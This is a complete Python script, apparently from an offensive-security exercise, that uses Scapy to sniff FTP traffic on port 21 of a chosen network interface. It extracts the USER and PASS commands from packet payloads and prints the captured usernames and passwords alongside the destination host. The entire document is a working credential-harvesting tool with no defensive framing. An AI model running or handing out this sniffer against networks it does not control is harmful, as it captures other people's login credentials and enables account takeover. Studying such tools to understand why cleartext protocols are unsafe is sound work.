from scapy.all import *
import re
import optparse

def ftpSniff(pkt):
    if TCP in pkt and pkt[TCP].payload:
        raw = bytes(pkt[TCP].payload)
        user = re.findall(r'(?i)USER (.+)', raw.decode(errors='ignore'))
        pswd = re.findall(r'(?i)PASS (.+)', raw.decode(errors='ignore'))
        
        dest = pkt[IP].dst  # Moved this line inside the condition

        if user:
            print(f"[*] Detected FTP login to {dest}")
            print(f"[*] User account: {user[0]}")
            if pswd:
                print(f"[+] Password: {pswd[0]}")
        elif pswd:
            print(f"[+] Password: {pswd[0]}")

def main():
    parser = optparse.OptionParser("Usage: %prog -i <interface>")
    parser.add_option("-i", dest="interface", type="string", help="specify interface to listen on")

    (options, args) = parser.parse_args()
    if options.interface:
        conf.iface = options.interface
        print(f'[*] Listening on interface: {options.interface}')
    else:
        print(parser.usage)
        exit(0)

    try:
        sniff(filter='tcp port 21', prn=ftpSniff, store=0, iface=options.interface)
    except KeyboardInterrupt:
        print("\nExiting...")
        exit(0)

if __name__ == "__main__":
    main()
